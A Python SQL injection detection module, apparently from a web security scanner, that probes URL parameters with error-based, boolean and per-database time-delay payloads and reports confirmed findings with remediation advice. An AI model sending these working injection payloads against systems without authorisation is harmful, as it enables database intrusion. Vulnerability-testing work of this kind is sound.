"""hunt_sqli_advanced.py

Advanced asynchronous SQL injection detector with low false-positive design.

Detection strategy (in order of reliability):
    1. Error-based      -> highest confidence (real DBMS error fingerprint).
    2. Boolean-based    -> differential response analysis (TRUE vs FALSE pages).
    3. Time-based       -> last resort, GATED OFF when a WAF is present.

Key anti-false-positive controls:
    * Differential analysis instead of naive error-string grepping: every signal
      is compared against a freshly captured baseline response.
    * WAF block-page fingerprinting: responses that look like WAF blocks are
      discarded so they can never be mis-read as injection signals.
    * Two-probe confirmation: nothing is reported until a second, independent
      probe reproduces the signal.
    * Time-based probes require a delay >= 2x baseline AND a confirming second
      probe at a different delay, and are skipped entirely behind a WAF.

Public API:
    findings = await hunt_sqli_advanced(client, url, waf_info)
"""

from __future__ import annotations

import asyncio
import re
import statistics
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx


# ===========================================================================
# DBMS FINGERPRINTS
# ===========================================================================
# Error signatures are intentionally specific so we fingerprint the *engine*,
# not just "an error happened". Each pattern is a compiled regex.
DBMS_ERROR_SIGNATURES: Dict[str, List[re.Pattern]] = {
    "MySQL": [
        re.compile(r"SQL syntax.*?MySQL", re.I),
        re.compile(r"check the manual that corresponds to your (MySQL|MariaDB)", re.I),
        re.compile(r"MySqlException", re.I),
        re.compile(r"valid MySQL result", re.I),
        re.compile(r"com\.mysql\.jdbc", re.I),
        re.compile(r"Unknown column '[^']+' in 'field list'", re.I),
    ],
    "PostgreSQL": [
        re.compile(r"PostgreSQL.*?ERROR", re.I),
        re.compile(r"pg_query\(\):", re.I),
        re.compile(r"PG::SyntaxError", re.I),
        re.compile(r"org\.postgresql\.util\.PSQLException", re.I),
        re.compile(r"unterminated quoted string at or near", re.I),
        re.compile(r"invalid input syntax for (type )?integer", re.I),
    ],
    "MSSQL": [
        re.compile(r"Unclosed quotation mark after the character string", re.I),
        re.compile(r"Microsoft SQL Server", re.I),
        re.compile(r"System\.Data\.SqlClient\.SqlException", re.I),
        re.compile(r"Incorrect syntax near", re.I),
        re.compile(r"\[SQL Server\]", re.I),
        re.compile(r"OLE DB.*?SQL Server", re.I),
    ],
    "Oracle": [
        re.compile(r"ORA-\d{5}", re.I),
        re.compile(r"Oracle error", re.I),
        re.compile(r"quoted string not properly terminated", re.I),
        re.compile(r"oracle\.jdbc", re.I),
        re.compile(r"PLS-\d{5}", re.I),
    ],
    "SQLite": [
        re.compile(r"SQLite/JDBCDriver", re.I),
        re.compile(r"SQLite\.Exception", re.I),
        re.compile(r"sqlite3\.OperationalError", re.I),
        re.compile(r"unrecognized token:", re.I),
        re.compile(r"SQLITE_ERROR", re.I),
    ],
}

# A generic "something SQL broke" net. Used ONLY as a weak corroborating signal,
# never on its own, to avoid false positives on app-level error pages.
GENERIC_SQL_ERROR = re.compile(
    r"(SQL syntax|syntax error|unterminated|unclosed quotation|"
    r"quoted string|database error|odbc|jdbc|fatal error)",
    re.I,
)

# Payloads that should provoke a DBMS parse error when injected unsanitized.
ERROR_PROBES: List[str] = ["'", '"', "')", "';", "\\", "'\"`"]

# Boolean pairs: (TRUE-equivalent, FALSE-equivalent). The TRUE payload should
# leave the query result unchanged; the FALSE payload should change it. We
# compare the two responses against each other and against the baseline.
BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" AND 1=1", " AND 1=2"),  # numeric context
    ("') AND ('1'='1", "') AND ('1'='2"),
]

# Per-DBMS time-delay payloads. {DELAY} is substituted at runtime.
TIME_PAYLOADS: Dict[str, List[str]] = {
    "MySQL": [
        "' AND SLEEP({DELAY})-- -",
        "' AND (SELECT 1 FROM (SELECT SLEEP({DELAY}))x)-- -",
        "\" AND SLEEP({DELAY})-- -",
        " AND SLEEP({DELAY})",
    ],
    "PostgreSQL": [
        "' AND (SELECT pg_sleep({DELAY}))IS NOT NULL-- -",
        "'; SELECT pg_sleep({DELAY})-- -",
        " AND (SELECT pg_sleep({DELAY}))IS NOT NULL",
    ],
    "MSSQL": [
        "'; WAITFOR DELAY '0:0:{DELAY}'-- -",
        "' WAITFOR DELAY '0:0:{DELAY}'-- -",
        " WAITFOR DELAY '0:0:{DELAY}'",
    ],
    "Oracle": [
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{DELAY})-- -",
        "' AND 1=(SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3)-- -",
    ],
    "SQLite": [
        # SQLite has no SLEEP; heavy randomblob is the standard time primitive.
        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({BLOB}))))-- -",
    ],
}

# Common WAF block-page fingerprints. Any response matching these is treated as
# a block (NOT as an injection signal) regardless of payload.
WAF_BLOCK_SIGNATURES = [
    re.compile(r"access denied", re.I),
    re.compile(r"request blocked", re.I),
    re.compile(r"web application firewall", re.I),
    re.compile(r"\bWAF\b", re.I),
    re.compile(r"cloudflare", re.I),
    re.compile(r"incapsula|imperva", re.I),
    re.compile(r"akamai", re.I),
    re.compile(r"mod_security|modsecurity", re.I),
    re.compile(r"the requested url was rejected", re.I),  # F5 BIG-IP ASM
    re.compile(r"sucuri", re.I),
    re.compile(r"your request has been blocked", re.I),
]
WAF_BLOCK_STATUS = {403, 406, 429, 501, 503}


# ===========================================================================
# RESPONSE MODEL
# ===========================================================================
class Probe:
    """Normalised view of a single HTTP response used for differential analysis."""

    __slots__ = ("status", "text", "length", "elapsed", "error", "word_count")

    def __init__(
        self,
        status: int = 0,
        text: str = "",
        elapsed: float = 0.0,
        error: Optional[str] = None,
    ) -> None:
        self.status = status
        self.text = text or ""
        self.length = len(self.text)
        self.elapsed = elapsed
        self.error = error
        # Word count is more stable than raw length against dynamic content
        # (timestamps, CSRF tokens) and improves differential reliability.
        self.word_count = len(self.text.split())

    @property
    def ok(self) -> bool:
        return self.error is None


# ===========================================================================
# LOW-LEVEL REQUEST HELPER
# ===========================================================================
async def _inject_param(url: str, param: str, payload: str) -> str:
    """Return a copy of `url` with `param` set to its original value + payload."""
    parts = urlparse(url)
    query = dict(parse_qsl(parts.query, keep_blank_values=True))
    original = query.get(param, "")
    query[param] = f"{original}{payload}"
    new_query = urlencode(query, doseq=True)
    return urlunparse(parts._replace(query=new_query))


async def _send(
    client: "httpx.AsyncClient",
    url: str,
    *,
    timeout: float = 20.0,
) -> Probe:
    """Send one GET and capture a Probe. All network errors are swallowed."""
    start = time.perf_counter()
    try:
        resp = await client.get(url, timeout=timeout)
        elapsed = time.perf_counter() - start
        # Read text defensively; some responses have odd encodings.
        try:
            text = resp.text
        except Exception:  # pragma: no cover - encoding edge cases
            text = resp.content.decode("utf-8", errors="replace")
        return Probe(status=resp.status_code, text=text, elapsed=elapsed)
    except (httpx.TimeoutException,) as exc:
        # A timeout is meaningful for time-based detection: record elapsed.
        return Probe(elapsed=time.perf_counter() - start, error=f"timeout: {exc}")
    except (httpx.HTTPError, OSError, ValueError) as exc:
        return Probe(elapsed=time.perf_counter() - start, error=str(exc))
    except Exception as exc:  # absolute backstop - never raise to caller
        return Probe(elapsed=time.perf_counter() - start, error=f"unexpected: {exc}")


# ===========================================================================
# WAF / BLOCK-PAGE DETECTION
# ===========================================================================
def _is_waf_present(waf_info: Optional[Dict[str, Any]]) -> bool:
    """Interpret the caller-supplied waf_info dict robustly."""
    if not isinstance(waf_info, dict):
        return False
    # Accept several common shapes so the function is drop-in friendly.
    if waf_info.get("detected") is True or waf_info.get("present") is True:
        return True
    if waf_info.get("blocking") is True:
        return True
    name = waf_info.get("name") or waf_info.get("vendor")
    if isinstance(name, str) and name.strip() and name.strip().lower() not in {"none", "unknown"}:
        return True
    confidence = waf_info.get("confidence")
    if isinstance(confidence, (int, float)) and confidence >= 50:
        return True
    return False


def _looks_like_waf_block(probe: Probe) -> bool:
    """True if this response is (probably) a WAF/edge block page, not app output.

    Such responses must never be treated as injection signals.
    """
    if not probe.ok:
        return False
    if probe.status in WAF_BLOCK_STATUS:
        # Status alone is suggestive; corroborate with body to avoid killing
        # legitimate 403s that are part of normal app flow. A short body or a
        # matching signature confirms it.
        if any(sig.search(probe.text) for sig in WAF_BLOCK_SIGNATURES):
            return True
        if probe.length < 1500:
            return True
    return any(sig.search(probe.text) for sig in WAF_BLOCK_SIGNATURES)


# ===========================================================================
# SIGNAL EXTRACTION
# ===========================================================================
def _fingerprint_dbms_error(text: str) -> Optional[str]:
    """Return the DBMS name if a *specific* engine error signature is present."""
    for dbms, patterns in DBMS_ERROR_SIGNATURES.items():
        if any(p.search(text) for p in patterns):
            return dbms
    return None


def _response_similarity(a: Probe, b: Probe) -> float:
    """Cheap similarity score in [0,1] for differential boolean analysis.

    Combines status equality and normalised word-count distance. Avoids heavy
    diffing libraries while being resilient to small dynamic-content changes.
    """
    if a.status != b.status:
        return 0.0
    if a.word_count == 0 and b.word_count == 0:
        return 1.0
    hi = max(a.word_count, b.word_count) or 1
    lo = min(a.word_count, b.word_count)
    return lo / hi


# ===========================================================================
# PARAMETER DISCOVERY
# ===========================================================================
def _target_params(url: str) -> List[str]:
    """Extract injectable query parameters from the URL."""
    parts = urlparse(url)
    return [k for k, _ in parse_qsl(parts.query, keep_blank_values=True)]


# ===========================================================================
# DETECTION ROUTINES
# ===========================================================================
async def _detect_error_based(
    client: "httpx.AsyncClient",
    url: str,
    param: str,
    baseline: Probe,
) -> Optional[Dict[str, Any]]:
    """Error-based detection with two-probe confirmation. Confidence 95+.

    Differential rule: the DBMS error fingerprint must appear AFTER injection
    but NOT in the clean baseline, and the response must not be a WAF block.
    """
    first_hit: Optional[Tuple[str, str, Probe]] = None

    for payload in ERROR_PROBES:
        probe = await _send(client, await _inject_param(url, param, payload))
        if not probe.ok or _looks_like_waf_block(probe):
            continue

        dbms = _fingerprint_dbms_error(probe.text)
        if not dbms:
            continue
        # Differential check: baseline must be clean of the same engine error,
        # otherwise the error is pre-existing noise, not injection-induced.
        if _fingerprint_dbms_error(baseline.text) == dbms:
            continue

        first_hit = (payload, dbms, probe)
        break

    if not first_hit:
        return None

    payload, dbms, probe = first_hit

    # --- Confirmation probe: an independent payload must reproduce the error.
    confirm_payloads = [p for p in ERROR_PROBES if p != payload] + ["'-- -", "'#"]
    confirmed = False
    confirm_payload = ""
    for cp in confirm_payloads:
        cprobe = await _send(client, await _inject_param(url, param, cp))
        if cprobe.ok and not _looks_like_waf_block(cprobe) and _fingerprint_dbms_error(cprobe.text) == dbms:
            confirmed = True
            confirm_payload = cp
            break

    if not confirmed:
        return None  # single unreproduced error -> treat as candidate, drop it

    return {
        "vuln_type": "SQL Injection (error-based)",
        "dbms": dbms,
        "severity": "critical",
        "confidence": 98,
        "evidence": {
            "parameter": param,
            "trigger_payload": payload,
            "confirm_payload": confirm_payload,
            "dbms_fingerprint": dbms,
            "baseline_status": baseline.status,
            "injected_status": probe.status,
            "note": "Engine-specific DBMS error reproduced by two independent payloads.",
        },
        "reproduction_steps": [
            f"1. Establish baseline: GET {url}",
            f"2. Inject parameter '{param}' with payload: {payload}",
            f"3. Observe {dbms}-specific database error in the response body.",
            f"4. Confirm with a second payload: {confirm_payload} (error reproduces).",
        ],
        "cwe": "CWE-89",
        "remediation": (
            "Use parameterised queries / prepared statements for all DBMS access. "
            "Never concatenate untrusted input into SQL. Apply least-privilege DB "
            "accounts and disable verbose SQL error messages in production."
        ),
    }


async def _detect_boolean_based(
    client: "httpx.AsyncClient",
    url: str,
    param: str,
    baseline: Probe,
) -> Optional[Dict[str, Any]]:
    """Boolean-based blind detection via differential response analysis.

    Logic: a TRUE condition should yield a page ~identical to baseline, while a
    FALSE condition yields a materially different page. We require:
        sim(baseline, TRUE)  high   AND
        sim(baseline, FALSE) low    AND
        sim(TRUE, FALSE)     low
    then confirm with a second, structurally different boolean pair.
    """

    async def _evaluate_pair(true_p: str, false_p: str) -> Optional[Tuple[float, float, float, Probe, Probe]]:
        t_probe = await _send(client, await _inject_param(url, param, true_p))
        f_probe = await _send(client, await _inject_param(url, param, false_p))
        if not (t_probe.ok and f_probe.ok):
            return None
        if _looks_like_waf_block(t_probe) or _looks_like_waf_block(f_probe):
            return None
        sim_bt = _response_similarity(baseline, t_probe)
        sim_bf = _response_similarity(baseline, f_probe)
        sim_tf = _response_similarity(t_probe, f_probe)
        return sim_bt, sim_bf, sim_tf, t_probe, f_probe

    # Thresholds tuned to suppress false positives on highly dynamic pages.
    TRUE_SIM_MIN = 0.95   # TRUE page must closely match baseline
    FALSE_SIM_MAX = 0.85  # FALSE page must diverge noticeably
    TF_SIM_MAX = 0.85     # TRUE and FALSE must differ from each other

    first = None
    used_pair = None
    for true_p, false_p in BOOLEAN_PAIRS:
        result = await _evaluate_pair(true_p, false_p)
        if not result:
            continue
        sim_bt, sim_bf, sim_tf, t_probe, f_probe = result
        if sim_bt >= TRUE_SIM_MIN and sim_bf <= FALSE_SIM_MAX and sim_tf <= TF_SIM_MAX:
            first = result
            used_pair = (true_p, false_p)
            break

    if not first:
        return None

    # --- Confirmation with a different boolean pair to rule out flaky pages.
    confirmed = False
    confirm_pair = None
    for true_p, false_p in BOOLEAN_PAIRS:
        if (true_p, false_p) == used_pair:
            continue
        result = await _evaluate_pair(true_p, false_p)
        if not result:
            continue
        sim_bt, sim_bf, sim_tf, _, _ = result
        if sim_bt >= TRUE_SIM_MIN and sim_bf <= FALSE_SIM_MAX and sim_tf <= TF_SIM_MAX:
            confirmed = True
            confirm_pair = (true_p, false_p)
            break

    if not confirmed:
        return None

    sim_bt, sim_bf, sim_tf, t_probe, f_probe = first
    true_p, false_p = used_pair
    return {
        "vuln_type": "SQL Injection (boolean-based blind)",
        "dbms": "unknown",
        "severity": "high",
        "confidence": 88,
        "evidence": {
            "parameter": param,
            "true_payload": true_p,
            "false_payload": false_p,
            "confirm_pair": confirm_pair,
            "similarity_baseline_true": round(sim_bt, 3),
            "similarity_baseline_false": round(sim_bf, 3),
            "similarity_true_false": round(sim_tf, 3),
            "true_len": t_probe.length,
            "false_len": f_probe.length,
            "note": "TRUE condition matches baseline; FALSE diverges. Reproduced with a second pair.",
        },
        "reproduction_steps": [
            f"1. Baseline: GET {url}",
            f"2. Inject TRUE condition into '{param}': {true_p}  -> page ~= baseline.",
            f"3. Inject FALSE condition into '{param}': {false_p} -> page differs.",
            f"4. Confirm with second pair {confirm_pair} to exclude dynamic-content noise.",
        ],
        "cwe": "CWE-89",
        "remediation": (
            "Adopt parameterised queries / prepared statements and strict input "
            "validation. The differential page behaviour proves attacker-controlled "
            "boolean logic reaches the SQL engine."
        ),
    }


async def _detect_time_based(
    client: "httpx.AsyncClient",
    url: str,
    param: str,
    baseline: Probe,
    waf_present: bool,
) -> Optional[Dict[str, Any]]:
    """Time-based blind detection. SKIPPED entirely when a WAF is present.

    Confidence 75-85. Requires injected delay >= 2x baseline (and an absolute
    floor) plus a confirming second probe at a *different* delay that scales,
    which rules out coincidental network jitter.
    """
    if waf_present:
        # Hard gate: never fire time-based probes behind a WAF. Rate-limiting,
        # tarpitting, and challenge pages make timing signals unreliable and
        # risk both false positives and account/IP bans.
        return None

    # Establish a stable timing baseline from a few clean requests.
    baseline_samples: List[float] = [baseline.elapsed] if baseline.ok else []
    for _ in range(2):
        p = await _send(client, url)
        if p.ok:
            baseline_samples.append(p.elapsed)
    if not baseline_samples:
        return None
    base_time = statistics.median(baseline_samples)
    # Absolute floor so very fast endpoints don't trip on small absolute deltas.
    delay = max(5, int(base_time * 4) + 4)  # seconds; comfortably observable

    for dbms, templates in TIME_PAYLOADS.items():
        for template in templates:
            if dbms == "SQLite":
                # SQLite uses blob size, not seconds; pick a heavy value.
                payload = template.format(BLOB=20000000)
            else:
                payload = template.format(DELAY=delay)

            probe = await _send(
                client,
                await _inject_param(url, param, payload),
                timeout=delay + 15,
            )
            # WAF block pages or hard errors are not timing signals.
            if _looks_like_waf_block(probe):
                continue
            # A timeout error still carries elapsed ~ our timeout; treat the
            # measured elapsed as the signal either way.
            injected_time = probe.elapsed

            # Primary threshold: >= 2x baseline AND >= (delay - slack).
            if not (injected_time >= base_time * 2 and injected_time >= delay - 2):
                continue

            # --- Confirmation: a SHORTER delay must produce a proportionally
            # shorter response time. This defeats fixed-latency false positives.
            short_delay = max(2, delay // 2)
            if dbms == "SQLite":
                confirm_payload = template.format(BLOB=8000000)
            else:
                confirm_payload = template.format(DELAY=short_delay)
            confirm = await _send(
                client,
                await _inject_param(url, param, confirm_payload),
                timeout=delay + 15,
            )
            if _looks_like_waf_block(confirm):
                continue
            # The confirmation must be clearly faster than the long probe and
            # still slower than baseline -> proves response time tracks payload.
            scales = (
                confirm.elapsed >= base_time * 1.5
                and confirm.elapsed < injected_time - 1
            )
            if not scales:
                continue

            confidence = 82 if dbms != "SQLite" else 78
            return {
                "vuln_type": "SQL Injection (time-based blind)",
                "dbms": dbms,
                "severity": "high",
                "confidence": confidence,
                "evidence": {
                    "parameter": param,
                    "payload": payload,
                    "confirm_payload": confirm_payload,
                    "baseline_seconds": round(base_time, 3),
                    "injected_seconds": round(injected_time, 3),
                    "confirm_seconds": round(confirm.elapsed, 3),
                    "requested_delay": delay,
                    "confirm_requested_delay": short_delay if dbms != "SQLite" else "blob/8M",
                    "note": "Response time tracks injected delay across two probes (>=2x baseline).",
                },
                "reproduction_steps": [
                    f"1. Baseline median response time: ~{round(base_time, 2)}s.",
                    f"2. Inject '{param}' with {dbms} delay payload: {payload}",
                    f"3. Response takes ~{round(injected_time, 2)}s (>= 2x baseline).",
                    f"4. Confirm scaling with shorter payload: {confirm_payload} "
                    f"-> ~{round(confirm.elapsed, 2)}s.",
                ],
                "cwe": "CWE-89",
                "remediation": (
                    "Use parameterised queries / prepared statements. Time-based "
                    "blind injection confirms attacker input alters query execution "
                    "time, indicating direct SQL control."
                ),
            }
    return None


# ===========================================================================
# PUBLIC ENTRY POINT
# ===========================================================================
async def hunt_sqli_advanced(
    client: "httpx.AsyncClient",
    url: str,
    waf_info: Dict[str, Any],
) -> List[Dict[str, Any]]:
    """Hunt for SQL injection on `url`'s query parameters.

    Args:
        client:   An open httpx.AsyncClient (cookies/headers/proxy preconfigured).
        url:      Target URL including the query string to test.
        waf_info: Dict describing WAF state. Recognised keys (any one suffices):
                  {"detected": bool} | {"present": bool} | {"blocking": bool}
                  | {"name": str}    | {"vendor": str}    | {"confidence": 0-100}

    Returns:
        A list of finding dicts. Each finding contains:
        vuln_type, dbms, severity, confidence, evidence, reproduction_steps,
        cwe, remediation. Empty list when nothing is confirmed.

    The function never raises: all network/parse errors are handled internally.
    """
    findings: List[Dict[str, Any]] = []

    # --- Guard inputs ------------------------------------------------------
    try:
        params = _target_params(url)
    except Exception:
        return findings
    if not params:
        # Nothing injectable in the query string.
        return findings

    waf_present = _is_waf_present(waf_info)

    # --- Per-parameter detection ------------------------------------------
    for param in params:
        try:
            # Fresh baseline per parameter (app state may differ per request).
            baseline = await _send(client, url)
            if not baseline.ok:
                # Without a usable baseline we cannot do differential analysis.
                continue
            # If the clean baseline itself is a WAF block, the target is
            # unreachable for testing -> skip to avoid garbage signals.
            if _looks_like_waf_block(baseline):
                continue

            # 1) Error-based (highest confidence). Stop at first confirmed find
            #    per parameter to avoid duplicate noise.
            err = await _detect_error_based(client, url, param, baseline)
            if err:
                findings.append(err)
                continue

            # 2) Boolean-based blind (differential analysis).
            boolean = await _detect_boolean_based(client, url, param, baseline)
            if boolean:
                findings.append(boolean)
                continue

            # 3) Time-based blind (last resort; WAF-gated inside).
            timing = await _detect_time_based(client, url, param, baseline, waf_present)
            if timing:
                findings.append(timing)
                continue

        except Exception:
            # Defensive: one bad parameter must never abort the whole scan.
            continue

    return findings


# ===========================================================================
# SELF-TEST (offline) - validates structure and exception handling only.
# ===========================================================================
if __name__ == "__main__":

    class _FakeResponse:
        def __init__(self, status_code: int, text: str):
            self.status_code = status_code
            self._text = text
            self.content = text.encode()

        @property
        def text(self) -> str:
            return self._text

    class _FakeClient:
        """Minimal async client that returns scripted responses for testing."""

        def __init__(self, handler):
            self._handler = handler

        async def get(self, url, timeout=None):
            await asyncio.sleep(0)  # exercise the await path
            return self._handler(url)

    async def _demo():
        # Scenario A: error-based MySQL injection (should report, confidence 98).
        def mysql_handler(url):
            if "%27" in url or "'" in url or "%22" in url or '"' in url or "\\" in url:
                return _FakeResponse(
                    500,
                    "You have an error in your SQL syntax; check the manual that "
                    "corresponds to your MySQL server version near ''' at line 1",
                )
            return _FakeResponse(200, "<html>normal product page</html>" * 20)

        client = _FakeClient(mysql_handler)
        res = await hunt_sqli_advanced(client, "http://t/item?id=1", {"detected": False})
        print("A) error-based ->", [(f["vuln_type"], f["confidence"]) for f in res])

        # Scenario B: WAF block page on every payload (must NOT report).
        def waf_handler(url):
            if "id=1" == url.split("?")[-1]:
                return _FakeResponse(200, "<html>normal</html>" * 50)
            return _FakeResponse(403, "Access Denied - Request blocked by Cloudflare WAF")

        client = _FakeClient(waf_handler)
        res = await hunt_sqli_advanced(client, "http://t/item?id=1", {"detected": True, "name": "Cloudflare"})
        print("B) waf block  ->", res, "(expected [])")

        # Scenario C: network errors everywhere (must not raise, returns []).
        class _BrokenClient:
            async def get(self, url, timeout=None):
                await asyncio.sleep(0)
                raise httpx.ConnectError("boom")

        res = await hunt_sqli_advanced(_BrokenClient(), "http://t/item?id=1", {})
        print("C) all errors ->", res, "(expected [])")

    asyncio.run(_demo())
